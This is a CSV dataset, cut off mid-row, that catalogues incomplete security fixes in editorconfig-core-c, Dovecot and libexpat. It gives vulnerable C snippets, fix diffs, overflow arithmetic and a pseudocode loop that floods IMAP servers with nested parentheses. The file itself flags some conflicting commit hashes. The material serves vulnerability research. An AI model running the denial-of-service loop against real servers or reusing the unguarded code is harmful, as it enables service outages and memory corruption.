"case_id","product_component","affected_language","source_file_path(s)","function(s)_affected","original_cve_id","original_cve_cwe","original_cve_cvss","original_cve_description","original_vulnerable_code_snippet","original_fix_commit_hash","original_fix_commit_url","original_fix_pr_or_ref","original_fix_date","original_fix_version","original_fix_author_or_merger","original_fix_code_diff","original_fix_source_range","original_fix_description_or_commit_message","incomplete_fix_cve_id","incomplete_fix_cve_cwe","incomplete_fix_cve_cvss","incomplete_fix_cve_description","bypass_mechanism_root_cause","vulnerable_code_snippet_after_original_fix","discoverer_of_incomplete_fix","discovery_date_of_bypass","gap_between_original_fix_and_bypass_discovery","complete_fix_commit_hash(es)","complete_fix_commit_url(s)","complete_fix_pr_or_ref","complete_fix_date","complete_fix_version","complete_fix_code_diff","complete_fix_source_range","complete_fix_description_or_commit_message","root_cause_category","poc_available","poc_summary_or_code","attack_scenario","affected_versions_range","discoverer_credits_full","nvd_or_advisory_signal_phrase","classification_note","information_sources_urls","misc_notes"
"CASE-01","editorconfig-core-c (libeditorconfig) — EditorConfig C parser used by Vim, Emacs, Gedit, gnome-text-editor, VS Code plugin, etc.","C","src/lib/ec_glob.c","ec_glob()","CVE-2023-0341","CWE-787 (Out-of-bounds Write)","HIGH 8.6","Stack buffer overflow in ec_glob(): output characters written to stack buffer pcre_str (declared char pcre_str[2*PATTERN_MAX]=8194 bytes) with no bounds check while converting an EditorConfig glob pattern into a PCRE regex string; PCRE-escaped form of a char can be longer than input (e.g. backslash prepended to non-alphanumerics), allowing adversarial patterns to overflow pcre_str and smash the stack canary/return address (demonstrated RCE by researcher litios).","/* ec_glob.c pre-fix (pre PR#87) unbounded writes, e.g.: */
*(p_pcre ++) = *c;
/* repeated for every char in glob-to-regex translation, no bound check against pcre_str_end */","41281ea82fbf24b060a9f69b9c5369350fb0529e","https://github.com/editorconfig/editorconfig-core-c/commit/41281ea82fbf24b060a9f69b9c5369350fb0529e","PR #87 (""Fix potential buffer overflow in ec_glob"")","2023-01-19","v0.12.6","xuhdev (author & merger)","/* PR #87 fix - new safe write macros for pcre_str */
#define ADD_CHAR(string, new_chr, end) do { \
  if (string + 1 >= end)                    \
    return -1;                               \
  *(string ++) = new_chr;                    \
} while(0)
/* every previous unbounded write to pcre_str replaced, e.g.: */
/* BEFORE: *(p_pcre ++) = *c; */
/* AFTER:  ADD_CHAR(p_pcre, *c, pcre_str_end); */
char *pcre_str_end = pcre_str + 2 * PATTERN_MAX;
---- actual PR diff hunks (from litios.github.io writeup) ----
@@ -57,6 +57,13 @@ static const UT_icd ut_int_pair_icd ...
+#define ADD_CHAR(string, new_chr, end) do { \
+  if (string + 1 >= end) \
+    return -1; \
+  *(string ++) = new_chr; \
+} while(0)
@@ -131,8 +138,8 @@ int ec_glob(const char *pattern, const char *string)
 case '\\': /* also skip the next one */
   if (*(c+1) != '\0') {
-    *(p_pcre ++) = *(c++);
-    *(p_pcre ++) = *c;
+    ADD_CHAR(p_pcre, *(c++), pcre_str_end);
+    ADD_CHAR(p_pcre, *c, pcre_str_end);
   } else STRING_CAT(p_pcre, ""\\\\"", pcre_str_end);
@@ -208,18 +215,18 @@ ... (bracket-case '[' rewritten to use ADD_CHAR/STRING_CAT throughout)","src/lib/ec_glob.c, approx lines 57-64 (macro def) and 131-215 (call-site rewrites)","""Fix potential buffer overflow in ec_glob"" — introduces ADD_CHAR/STRING_CAT bounds-checked write macros for the pcre_str output buffer; assigned CVE-2023-0341.","CVE-2026-40489","CWE-121 (Stack-based Buffer Overflow)","HIGH 8.6 (report); CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVE record, GitHub_M assigner)","editorconfig-core-c up to and including 0.12.10 has a stack-based buffer overflow in ec_glob() — incomplete fix for CVE-2023-0341. pcre_str was protected in 0.12.6 but the adjacent l_pattern[8194] stack buffer received no equivalent protection. On Ubuntu 24.04, FORTIFY_SOURCE converts the overflow to SIGABRT (DoS only); without it, escalation may be possible.","ec_glob() declares a second stack buffer of identical size directly above pcre_str in the stack frame: char l_pattern[2*PATTERN_MAX] (8194 bytes). The very first line of the function body copies the caller-supplied pattern into l_pattern via strcpy(l_pattern, pattern) with NO length check, before any of the newly-guarded pcre_str writes are ever reached. PR #87 audited every WRITE to pcre_str (the output) but never audited the unguarded READ/COPY of untrusted input at function entry. Symmetric-surface pattern: output guarded, sibling input buffer left open.","/* ec_glob.c:96-100 - BEFORE commit 5159be8 (i.e. state left by PR#87) */
int     ret = 0;                /* nothing between 'ret' and the strcpy */
strcpy(l_pattern, pattern);    /* UNBOUNDED -- CVE-2026-40489 */
p_pcre = pcre_str + 1;
pcre_str_end = pcre_str + 2 * PATTERN_MAX;","j-p-007 (GHSA advisory author)","April 2026 (GHSA advisory); CVE reserved 2026-04-13, published 2026-04-18","~3 years (Jan 2023 fix -> Apr 2026 disclosure)","5159be88ad50641d9843289adda791ba300421ff","https://github.com/editorconfig/editorconfig-core-c/commit/5159be88ad50641d9843289adda791ba300421ff","Commit 5159be8 (maintainer commit, no PR number given in source report)","April 2026","v0.12.11","/* ec_glob.c:96-107 - AFTER commit 5159be8, +5/-1 lines */
int     ret = 0;
+  size_t  pattern_len = strlen(pattern);        /* measure before copy (line 99) */
+
+  /* Reject patterns that would overflow l_pattern in the copy below. */
+  if (pattern_len >= sizeof(l_pattern))          /* guard added (lines 101-103) */
+      return -1;                                /* early rejection */
-  strcpy(l_pattern, pattern);                    /* REMOVED */
+  memcpy(l_pattern, pattern, pattern_len + 1);   /* safe bounded copy (line 104) */
p_pcre = pcre_str + 1;
pcre_str_end = pcre_str + 2 * PATTERN_MAX;","src/lib/ec_glob.c, lines 99-104 (function body lines 96-107 overall)","""Completes the buffer-overflow fix from #87, which bounded writes into pcre_str but left the initial strcpy of pattern into l_pattern at the top of ec_glob unguarded. Sufficiently long patterns smash the stack before any of the bounds-checked code runs."" (author: xuhdev, maintainer)","Input not validated at trust boundary; only output writes were guarded (symmetric input/output attack surface)","Yes — full PoC and exact arithmetic in GHSA advisory","pattern built in editorconfig.c:ini_handler() as malloc(strlen(dir)*2 + sizeof(""**/"") + strlen(section)). Attacker crafts: dir path of 4070 chars w/ 32 special chars ({, }) -> escapes to 4102 chars; .editorconfig section header of 4096 chars (ini.c MAX_SECTION_NAME limit); total pattern = 4102+3+4096 = 8201 bytes vs l_pattern[8194] => 7-byte overflow. On Ubuntu 24.04 FORTIFY_SOURCE intercepts strcpy overflow -> SIGABRT (exit 134); without hardening, adjacent stack metadata reachable.","Victim opens any file inside an attacker-controlled directory (e.g., after cloning a malicious git repository) in an editor using libeditorconfig (gnome-text-editor crashes immediately on Ubuntu 24.04). No privileges required, no user interaction beyond opening the file.","0.12.6 through 0.12.10 (versions with PR#87 fix but not commit 5159be8)","Original CVE-2023-0341: security researcher litios (working with Seth Arnold / Mark Esler fuzzing, MIR analysis). Incomplete-fix bypass CVE-2026-40489: j-p-007 (GHSA advisory, April 2026).","""This is an incomplete fix for CVE-2023-0341."" — CVE-2026-40489 description (NVD/Ubuntu/OffSeq mirrors)","INCOMPLETE FIX (per user definition: original fix failed to fully remediate; not a regression, not a reintroduction).","https://nvd.nist.gov/vuln/detail/CVE-2026-40489 ; https://ubuntu.com/security/CVE-2026-40489 ; https://nvd.nist.gov/vuln/detail/CVE-2023-0341 ; https://github.com/editorconfig/editorconfig-core-c/pull/87 ; https://github.com/editorconfig/editorconfig-core-c/commit/41281ea82fbf24b060a9f69b9c5369350fb0529e ; https://github.com/editorconfig/editorconfig-core-c/commit/5159be88ad50641d9843289adda791ba300421ff ; https://litios.github.io/2023/01/14/CVE-2023-0341.html ; https://security-tracker.debian.org/tracker/CVE-2023-0341 ; https://cve.threatint.eu/CVE/CVE-2026-40489 ; https://radar.offseq.com/threat/cve-2026-40489-cwe-121-stack-based-buffer-overflow-63bc89f7","Report source doc did not include an explicit Sources/References list for this case (unlike later cases in the file); commit hash for PR#87 (41281ea...) and NVD/Ubuntu URLs obtained via supplemental web search since they were not fully specified in the uploaded report."
"CASE-02","Dovecot IMAP/POP3 server — imap-login process, IMAP command parser","C","src/lib-imap/imap-parser.c ; src/imap-login/imap-login-client.h ; src/imap-login/imap-login-client.c ; src/imap-login/imap-login-cmd-id.c","imap_parser_create(); '(' / ')' token processing in the IMAP parser","CVE-2026-27857","CWE-400 (Uncontrolled Resource Consumption)","MEDIUM 4.3","Sending an IMAP NOOP command with ~4000 nested balanced parentheses, e.g. NOOP (((...))) , causes imap-login to allocate ~1MB of heap (one imap_parser_list heap node per '(' via p_new(), no depth limit). Attacker opens 1000 simultaneous connections, sends deeply nested NOOP without final LF (keeps connection open), accumulates ~1GB heap in imap-login, eventually hits vsz_limit and the process is killed, dropping all proxied connections.","/* imap-parser.c pre-fix conceptual struct */
struct imap_parser {
  struct imap_parser_list *list;  /* current innermost open list */
  /* No depth limit tracked */
};
/* Every '(' token causes: */
list = p_new(parser->pool, struct imap_parser_list, 1);  /* HEAP ALLOC, unbounded */
list->parent = parser->list;
parser->list = list;","af1fb4da (v2.4.3 initial fix commit, per source report)","Not given as a direct commit URL in source report (Dovecot core is on github.com/dovecot/core — exact tree URL not confirmed)","v2.4.3 fix; introduces imap_parser_params struct + list_count_limit field; IMAP_LOGIN_LIST_COUNT_LIMIT=1 for login-phase parsers","Before 2026-03-27 (v2.4.3 release)","v2.4.3","Not specified in source report","/* v2.4.3 fix adds list_count_limit param and IMAP_LOGIN_LIST_COUNT_LIMIT=1, but enforcement */
/* logic increments/checks the counter ONLY on ')' (list-completion) traversal, not on '(' (allocation). */","src/lib-imap/imap-parser.c (')' handling path)","Added list_count_limit parameter to imap_parser_create() and a new imap_parser_params struct; set IMAP_LOGIN_LIST_COUNT_LIMIT=1 for login-phase parsers. CVE-2026-27857 fix.","CVE-2026-42006","CWE-400 / CWE-770","Vendor/OX CNA: MEDIUM 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L); Red Hat ADP independent assessment: HIGH 7.5 (AV:N/AC:L/PR:N/UI:N, pre-auth reachable)","""An attacker can cause uncontrolled memory usage with excessive bracing over IMAP. The fix in CVE-2026-27857 was incomplete, only blocking one way of doing this, so there was still another way left open. In particular, the fix was for closing braces, but you could still use open braces to bypass the limit."" (NVD/OX advisory text). Residual/incomplete-fix issue per OX advisory OXDC-ADV-2026-0002.","In IMAP list parsing, ')' closes a list and triggers clean-up/traversal logic — this is where the v2.4.3 counter check was inserted. But '(' merely opens a new list node and pushes it onto the chain WITHOUT any depth-check at the push point; the counter is never incremented for open parens, so IMAP_LOGIN_LIST_COUNT_LIMIT was never enforced on the growing (allocation) side. Symmetric-token pattern: '(' and ')' are symmetric IMAP grammar tokens; only the closing-token path was guarded.","/* NOOP ))))...  -- BLOCKED by v2.4.3 fix (counter checked on close) */
/* NOOP ((((...  -- STILL UNBOUNDED after v2.4.3 (no counter check on open) */
/* Proof-of-concept (pseudocode): */
for i in range(1000):
    sock = connect(imap_server, port=143)
    sock.send('A001 NOOP ' + '(' * 8000 + '\r')  # no LF -- keeps connection open
    # imap-login parses 8000 '(' tokens, allocates 8000 imap_parser_list nodes (~1MB/conn)
    # no limit fires -- total ~1GB memory in imap-login process across 1000 conns","D4RKCYPH3R@yeswehack (same research group as original reporter whisperer@yeswehack, 7 weeks later)","Reported April 27, 2026; CVE-2026-42006 published on NVD 2026-05-12","31 days between CVE-2026-27857 disclosure (2026-03-27) and CVE-2026-42006 report (2026-04-27)","825bc297 (structural scaffolding: imap_parser_create() signature change, all 13 call sites updated); af1fb4da (enforcement: adds IMAP_LOGIN_LIST_COUNT_LIMIT constant and wires params into login-phase parser instantiation); d0f67b52 (imap-parser.c: '(' processing enforcement logic integrated)","Not given as direct commit URLs in source report (Dovecot core repo — exact URLs not located/confirmed via search)","3 related commits released together in v2.4.4","May 5, 2026 (v2.4.4 release)","Dovecot CE 2.4.4; OX Dovecot Pro 3.1.5","/* src/imap-login/imap-login-client.h -- NEW CONSTANT */
#define IMAP_LOGIN_LIST_COUNT_LIMIT 1

/* src/imap-login/imap-login-client.c -- imap_client_create() */
/* BEFORE (v2.4.3, NULL params, no limit enforced): */
imap_client->parser = imap_parser_create(imap_client->common.input, imap_client->common.output, IMAP_LOGIN_MAX_LINE_LENGTH, NULL);
/* AFTER (af1fb4d, params struct with list_count_limit=1): */
struct imap_parser_params params = { .list_count_limit = IMAP_LOGIN_LIST_COUNT_LIMIT };
imap_client->parser = imap_parser_create(imap_client->common.input, imap_client->common.output, IMAP_LOGIN_MAX_LINE_LENGTH, &params);

/* src/lib-imap/imap-parser.c -- '(' processing (post d0f67b52) */
case '(':
  if (parser->params.list_count_limit > 0 &&
      parser->list_depth >= parser->params.list_count_limit) {
    parser->error = IMAP_PARSE_ERROR_LITERAL_TOO_LARGE;
    return FALSE;
  }
  list = p_new(parser->pool, struct imap_parser_list, 1);
  list->parent = parser->list;
  parser->list = list;
  parser->list_depth++;
  break;","src/imap-login/imap-login-client.h (new #define); src/imap-login/imap-login-client.c (parser creation sites incl. STARTTLS re-creation); src/imap-login/imap-login-cmd-id.c (ID command parser); src/lib-imap/imap-parser.c ('(' case block)","""imap-login: Limit the number of open IMAP parser lists"" (af1fb4da) — check moved to allocation point (before p_new()) so no list node is ever allocated once the depth limit is reached. IMAP_LOGIN_LIST_COUNT_LIMIT=1 is intentionally strict since the only pre-auth command using lists (ID) needs just one level.","Symmetric attack surface — one token direction (close) guarded, sibling direction (open) missed; resource limit checked on construct-completion rather than allocation","Yes — pseudocode PoC in report; CISA/vendor advisory referenced","See vulnerable_code_snippet_after_original_fix column for full PoC loop.","Unauthenticated (pre-login) network attacker opens many IMAP connections and sends NOOP commands stuffed with thousands of unmatched '(' characters (bounded per-line by IMAP_LOGIN_MAX_LINE_LENGTH=8192 bytes, but repeatable across many connections/commands), driving unbounded heap growth in imap-login until vsz_limit kills the process.","Dovecot 2.4.3 (and OX Dovecot Pro <=3.1.4)","CVE-2026-27857: whisperer@yeswehack (Feb 2026). CVE-2026-42006: D4RKCYPH3R@yeswehack (Apr 2026) — same research group.","OXDC-ADV-2026-0002: ""The fix in CVE-2026-27857 was incomplete, only blocking one way of doing this, so there was still another way left open... the fix was for closing braces, but you could still use open braces to bypass the limit."" / ""This issue is a residual problem resulting from an incomplete fix for CVE-2026-27857.""","INCOMPLETE FIX (per user definition).","https://github.com/advisories/GHSA-h665-fh45-xq6r ; https://documentation.open-xchange.com/dovecot/security/advisories/html/2026/oxdc-adv-2026-0002.html ; https://documentation.open-xchange.com/dovecot/security/advisories/csaf/2026/oxdc-adv-2026-0002.json ; https://access.redhat.com/errata/RHSA-2026:44355 ; https://bugzilla.redhat.com/show_bug.cgi?id=2476476 ; https://access.redhat.com/security/cve/CVE-2026-42006 ; https://vulnerability.circl.lu/vuln/cve-2026-42006","CAUTION/discrepancy in source report: commit hash 'af1fb4da' is listed BOTH as the v2.4.3 original (incomplete) fix commit AND as one of the three v2.4.4 complete-fix commits (""enforcement"" commit). This is very likely an error/reuse in the source document (same short hash used for two different fixes) — flagged here rather than silently corrected, since no authoritative Dovecot commit history was available to verify the real hashes for either fix during this extraction."
"CASE-03","libexpat — streaming XML parser embedded in Python, Firefox, many Linux system tools","C","expat/lib/xmlparse.c","doContent(); doCdataSection(); beforeHandler(); afterHandler(); isCalledFromInsideHandler(); XML_GetBuffer(); XML_Parse(); XML_ParseBuffer(); XML_ParserFree(); XML_ParserReset()","CVE-2026-50219","CWE-416 (Use After Free)","4.9 MEDIUM — CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L","Use-after-free via handler reentrancy: no tracking of whether the parser is currently inside a handler invocation. Five public API functions (XML_GetBuffer, XML_Parse, XML_ParseBuffer, XML_ParserFree, XML_ParserReset) could be called freely from inside any user handler. E.g. a CharacterData handler calling XML_ParserFree() on its own parser frees the parser struct while the outer parse frame still holds/dereferences pointers into it -> UAF.","/* Application handler that frees the parser mid-parse */
void myCharDataHandler(void *userData, const XML_Char *s, int len) {
  XML_ParserFree((XML_Parser)userData);  /* UAF: outer parse frame */
  /* xmlparse.c continues to dereference freed parser after return */
}
XML_SetUserData(parser, parser);
XML_SetCharacterDataHandler(parser, myCharDataHandler);
XML_Parse(parser, doc, len, 1);  /* outer parse -> fires handler -> frees parser -> UAF */","Not individually specified; delivered via PR #1246 merge","https://github.com/libexpat/libexpat/pull/1246","PR #1246","2026-06-04 (merged)","libexpat 2.8.1","Not specified (merged by hartwork per libexpat maintainer convention referenced elsewhere in report)","/* Added to XML_ParserStruct */
unsigned int m_handlerCallDepth;   /* 0 = not inside handler; >0 = inside */
static void beforeHandler(XML_Parser parser) { parser->m_handlerCallDepth++; }
static void afterHandler(XML_Parser parser) { parser->m_handlerCallDepth--; }
static XML_Bool isCalledFromInsideHandler(XML_Parser parser) {
  return (parser->m_handlerCallDepth > 0) ? XML_TRUE : XML_FALSE;
}
/* Example guard added to XML_ParserFree() (same pattern on the other 4 functions): */
void XMLCALL XML_ParserFree(XML_Parser parser) {
+ if (isCalledFromInsideHandler(parser)) {
+   parser->m_errorCode = XML_ERROR_INVALID_ARGUMENT;
+   return;
+ }
  /* ... normal free logic ... */
}
/* doContent() handler call sites wrapped: */
if (charDataHandler) {
+  beforeHandler(parser);
   charDataHandler(parser->m_handlerArg, parser->m_dataBuf, ...);
+  afterHandler(parser);
}","expat/lib/xmlparse.c — XML_ParserStruct definition; all handler call sites within doContent()","Introduces m_handlerCallDepth counter with beforeHandler()/afterHandler() bracketing every handler invocation in doContent(); guards added to the five reentrancy-dangerous public API functions.","CVE-2026-56412","CWE-416 (Use After Free)","4.9 MEDIUM — CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L (same as parent)","Same use-after-free reachable via CDATA section: doCdataSection() invokes m_characterDataHandler for XML_TOK_DATA_CHARS without beforeHandler()/afterHandler(), so m_handlerCallDepth stays at 0 while the handler runs, bypassing isCalledFromInsideHandler() and thus all five PR #1246 guards. NVD signal: ""this issue exists because of an incomplete fix for CVE-2026-50219"".","doContent() and doCdataSection() are parallel entry points both delivering character data via the same m_characterDataHandler callback. PR #1246's grep-based audit wrapped handler calls in doContent() (and even correctly wrapped the XML_TOK_DATA_NEWLINE case inside doCdataSection()) but missed the two XML_TOK_DATA_CHARS call sites inside doCdataSection() (one inside a MUST_CONVERT for(;;) encoding-conversion loop, one in the non-conversion branch) because their call pattern looked structurally different from the grep target.","case XML_TOK_DATA_CHARS: {
  const XML_Char *dataPtr = (const XML_Char *)parser->m_dataBuf;
  if (charDataHandler) {
    if (MUST_CONVERT(enc, s)) {
      for (;;) {
        const enum XML_Convert_Result convert_res = XmlConvert(enc, &s, next, &dataPtr, (ICHAR *)parser->m_dataBufEnd);
        *eventEndPP = next;
        /* NO beforeHandler() call here <- BUG */
        charDataHandler(parser->m_handlerArg, parser->m_dataBuf, (int)(dataPtr - (ICHAR *)parser->m_dataBuf));
        /* NO afterHandler() call here <- BUG, m_handlerCallDepth stays 0 */
        if ((convert_res == XML_CONVERT_COMPLETED) || (convert_res == XML_CONVERT_INPUT_INCOMPLETE)) break;
        *eventPP = s;
      }
    } else
      /* NO beforeHandler() call here <- BUG */
      charDataHandler(parser->m_handlerArg, (const XML_Char *)s, (int)((const XML_Char *)next - (const XML_Char *)s));
      /* NO afterHandler() call here <- BUG */
  } else if (parser->m_defaultHandler)
    reportDefault(parser, enc, s, next);
} break;

/* Contrast: XML_TOK_DATA_NEWLINE in the SAME function WAS correctly wrapped by PR #1246: */
case XML_TOK_DATA_NEWLINE:
  if (charDataHandler) {
    const XML_Char c = 0xA;
    beforeHandler(parser);
    charDataHandler(parser->m_handlerArg, &c, 1);
    afterHandler(parser);
  } else ...
  break;","hextheshadow (CVE-2026-56412 reporter and PR #1278 author)","PR #1278 opened and merged 2026-06-20","16 days (PR #1246 merged 2026-06-04 -> PR #1278 opened 2026-06-20)","d19e834794060d18c061d94452c35d725393ea58 (per report text); commit page linked as 11cd58eb92dd8ebd85e018eabb7357ee28fec1c7 (per Sources list — same PR, possibly squash/rebase hash difference)","https://github.com/libexpat/libexpat/pull/1278/files ; https://github.com/libexpat/libexpat/commit/11cd58eb92dd8ebd85e018eabb7357ee28fec1c7","PR #1278","2026-06-20 (opened) / 2026-06-21 (merged, per 'At a Glance' table)","libexpat 2.8.2","case XML_TOK_DATA_CHARS: {
  const XML_Char *dataPtr = (const XML_Char *)parser->m_dataBuf;
  if (charDataHandler) {
    if (MUST_CONVERT(enc, s)) {
      for (;;) {
        const enum XML_Convert_Result convert_res = XmlConvert(enc, &s, next, &dataPtr, (ICHAR *)parser->m_dataBufEnd);
        *eventEndPP = next;
+       beforeHandler(parser);                             /* ADDED */
        charDataHandler(parser->m_handlerArg, parser->m_dataBuf, (int)(dataPtr - (ICHAR *)parser->m_dataBuf));
+       afterHandler(parser);                              /* ADDED */
        if ((convert_res == XML_CONVERT_COMPLETED) || (convert_res == XML_CONVERT_INPUT_INCOMPLETE)) break;
        *eventPP = s;
      }
-   } else
+   } else {
      charDataHandler(parser->m_handlerArg, (const XML_Char *)s, (int)((const XML_Char *)next - (const XML_Char *)s));
+   }
  } else if (parser->m_defaultHandler)
    reportDefault(parser, enc, s, next);
} break;","expat/lib/xmlparse.c, doCdataSection(), ~line 4612 (both XML_TOK_DATA_CHARS call sites); +6/-1 lines total, single file","""doCdataSection() invokes m_characterDataHandler for XML_TOK_DATA_CHARS without beforeHandler()/afterHandler(), leaving m_handlerCallDepth at 0. This allows isCalledFromInsideHandler() to incorrectly return false during handler execution inside a CDATA section, bypassing the CVE-2026-50219 fix (PR #1246) on all five protected functions. Fix wraps both charDataHandler call sites in doCdataSection() with beforeHandler()/afterHandler(), matching the existing pattern in doContent() and XML_TOK_DATA_NEWLINE in the same function."" — hextheshadow. ASan-clean; all 4,800 existing tests pass after fix.","Incomplete manual/grep-based audit scope; inconsistency within the same function (one case wrapped, sibling case not); no exhaustive regression test for the missed code path","Conceptual PoC (handler calling protected API) shown for parent CVE; CDATA-triggered bypass is described mechanistically, no standalone exploit script included in report","Register a CharacterData handler that calls one of the five protected functions (e.g. XML_ParserFree) and trigger it via a CDATA section (<![CDATA[ ... ]]>) rather than ordinary element content, so m_handlerCallDepth remains 0 and the guard is bypassed.","Any application whose registered CharacterData handler can be induced (by application logic or a malicious/buggy caller) to invoke XML_Parse/XML_ParseBuffer/XML_GetBuffer/XML_ParserFree/XML_ParserReset while processing CDATA content re-enters the parser and triggers use-after-free.","libexpat 2.8.1 (has PR #1246 but not PR #1278); all libexpat < 2.8.1 vulnerable to the original CVE-2026-50219 with no handler-depth tracking at all","CVE-2026-56412: hextheshadow. CVE-2026-50219: hartwork / libexpat maintainer.","""this issue exists because of an incomplete fix for CVE-2026-50219"" (NVD signal, per report 'At a Glance' table)","INCOMPLETE FIX (per user definition).","https://nvd.nist.gov/vuln/detail/CVE-2026-56412 ; https://nvd.nist.gov/vuln/detail/CVE-2026-50219 ; https://github.com/libexpat/libexpat/pull/1278/files ; https://github.com/libexpat/libexpat/pull/1278 ; https://github.com/libexpat/libexpat/pull/1246 ; https://github.com/libexpat/libexpat/pull/1267 ; https://github.com/libexpat/libexpat/issues/1276 ; https://security-tracker.debian.org/tracker/CVE-2026-56412 ; https://github.com/libexpat/libexpat/commit/11cd58eb92dd8ebd85e018eabb7357ee28fec1c7","Report also flags PR #1267 as a THIRD, separate incomplete-fix path (XML_ResumeParser also missed by PR #1246) — noted as a related but distinct issue, not detailed further in the source document. Minor internal inconsistency in source doc: complete-fix commit hash given twice with two different values (d19e834794... in body text vs 11cd58eb92... in Sources link) — both preserved here verbatim rather than silently reconciled."
"CASE-03B","libexpat — streaming XML parser embedded in Python, Firefox, many Linux system tools (SIBLING incomplete-fix lineage to CASE-03, same original commit/CVE)","C","expat/lib/xmlparse.c","XML_ResumeParser(); beforeHandler(); afterHandler(); isCalledFromInsideHandler(); callProcessor()","CVE-2026-50219","CWE-416 (Use After Free)","4.9 MEDIUM — CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L","SAME parent vulnerability/fix as CASE-03: PR #1246 introduced handler-call-depth tracking (m_handlerCallDepth, beforeHandler()/afterHandler(), isCalledFromInsideHandler()) and guarded five public API entry points (XML_GetBuffer, XML_Parse, XML_ParseBuffer, XML_ParserFree, XML_ParserReset) against being called from inside a user handler. See CASE-03 for full original-vulnerability detail.","See CASE-03 for the pre-PR#1246 vulnerable state (no handler-depth tracking at all).","Not individually specified; delivered via PR #1246 merge","https://github.com/libexpat/libexpat/pull/1246","PR #1246 — ""[CVE-2026-50219] Introduce handler call depth tracking""","2026-06-04 (merged)","libexpat 2.8.1","hartwork (author)","See CASE-03 for the beforeHandler()/afterHandler()/isCalledFromInsideHandler() mechanism and the guards added to the five protected functions. PR #1246 wrapped handler call sites in doContent() (this case's gap) AND separately left XML_ResumeParser() itself completely unguarded (this row's gap) — a second, independent omission from the same PR.","expat/lib/xmlparse.c — XML_ParserStruct definition; handler call sites in doContent(); the five explicitly-guarded API functions (XML_ResumeParser was NOT among them)","Introduces m_handlerCallDepth counter with beforeHandler()/afterHandler() bracketing; guards added to XML_GetBuffer, XML_Parse, XML_ParseBuffer, XML_ParserFree, XML_ParserReset — but NOT to XML_ResumeParser, which drives the parser through callProcessor() in the same reentrant-dangerous way as XML_Parse.","CVE-2026-56131","CWE-416 (Use After Free)","4.9 MEDIUM — CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L","""libexpat before 2.8.2 lacks handler call depth tracking for calls to XML_ResumeParser from within handlers in cases of a policy violation. Thus, a use-after-free can occur (similar to the CVE-2026-50219 situation)."" -- MITRE/NVD description. A SECOND, independent gap in PR #1246, distinct from the doCdataSection() gap covered in CASE-03/CVE-2026-56412 -- both stem from the same original PR #1246 but were discovered and fixed by different people/PRs.","XML_ResumeParser() drives the parser through callProcessor() just like XML_Parse() does, re-entering parsing logic. A handler can legally call XML_StopParser(parser, XML_TRUE) to suspend parsing (this is an allowed/documented handler action), and then a subsequent call to XML_ResumeParser(parser) re-enters the parser while the outer parse frame is still live on the call stack -- the same memory-corruption path the other five guards were built to close. PR #1246's audit covered the five explicitly-named 'dangerous' functions but did not recognize XML_ResumeParser() as sharing the same reentrancy risk, since it is reached via a legitimate suspend/resume workflow rather than a direct nested call.","/* XML_ResumeParser() after PR #1246 -- NO isCalledFromInsideHandler() guard, unlike its four siblings */
XML_Status XMLCALL
XML_ResumeParser(XML_Parser parser) {
  /* NO guard here, unlike XML_ParserFree/XML_Parse/XML_ParseBuffer/XML_GetBuffer/XML_ParserReset */
  return callProcessor(parser, ...);  /* re-enters parsing loop even if called from inside a handler */
}

/* Exploit pattern: */
/* 1. A handler calls XML_StopParser(parser, XML_TRUE) -- suspends parsing (documented as legal from within a handler) */
/* 2. The SAME or a nested context then calls XML_ResumeParser(parser) while still notionally inside handler execution */
/* 3. m_handlerCallDepth is never checked -- parser re-enters, same class of use-after-free as the original CVE-2026-50219 */","netliomax25-code (GitHub username; author of PR #1267)","PR #1267 opened and merged around June 2026; CVE-2026-56131 reserved 2026-06-19, published 2026-06-19","~15 days (PR #1246 merged 2026-06-04 -> CVE-2026-56131 published 2026-06-19); essentially concurrent with the sibling CVE-2026-56412/PR #1278 fix","Not individually given by hash in available sources; delivered via PR #1267 merge","https://github.com/libexpat/libexpat/pull/1267","PR #1267 -- ""[CVE-REQUESTED] lib: Protect XML_ResumeParser from being called from a handler""","~June 2026 (fixed alongside CVE-2026-56412 in the 2.8.2 release cycle)","libexpat 2.8.2","/* PR #1267 -- adds the same isCalledFromInsideHandler() check used by the other five functions, */
/* at the top of XML_ResumeParser(), matching the pattern already used in XML_ParseBuffer(): */
XML_Status XMLCALL
XML_ResumeParser(XML_Parser parser) {
+ if (isCalledFromInsideHandler(parser)) {
+   parser->m_errorCode = XML_ERROR_INVALID_ARGUMENT;
+   return XML_STATUS_ERROR;
+ }
  return callProcessor(parser, ...);
}","expat/lib/xmlparse.c, XML_ResumeParser(), top of function body","""The handler-reentrancy guards from CVE-2026-50219 (PR #1246) added the isCalledFromInsideHandler check to XML_Parse, XML_ParseBuffer, XML_GetBuffer, XML_ParserFree and XML_ParserReset, but XML_ResumeParser was left out. XML_ResumeParser drives the parser through callProcessor just like XML_Parse, so a handler that first suspends with XML_StopParser(parser, XML_TRUE) (which is allowed from handlers) and then calls XML_ResumeParser(parser) re-enters the parser while the outer parse is still on the stack, the same memory-corruption path the other guards close. Added the same isCalledFromInsideHandler check at the top of XML_ResumeParser, matching XML_ParseBuffer. Validation: a regression test suspends from a character data handler and asserts the in-handler resume is rejected."" -- netliomax25-code, PR #1267 description","Incomplete enumeration of 'dangerous' API functions during the original audit -- XML_ResumeParser() shares the exact reentrancy mechanism (callProcessor) as XML_Parse() but was reached via a less obvious suspend/resume workflow (XML_StopParser then XML_ResumeParser) rather than a direct nested call, so it was omitted from the original list of five guarded functions","Yes -- regression test added in PR #1267: a character-data handler suspends the parser via XML_StopParser(parser, XML_TRUE), then the harness calls XML_ResumeParser(parser) from within/immediately after the handler context and asserts the in-handler resume is rejected","Register a handler that calls XML_StopParser(parser, XML_TRUE) to suspend parsing, then trigger XML_ResumeParser(parser) while still effectively inside the handler's call context -- re-enters the parser and its internal state while the outer parse frame is live, producing the same use-after-free class as the original CVE-2026-50219 PoC pattern.","Any application whose handler logic suspends parsing via XML_StopParser(XML_TRUE) and later resumes it via XML_ResumeParser() from a context effectively nested within the original handler invocation triggers parser re-entrancy and potential use-after-free, exactly analogous to the CVE-2026-50219 handler-reentrancy class but via the resume API rather than the five originally-guarded functions.","libexpat before 2.8.2 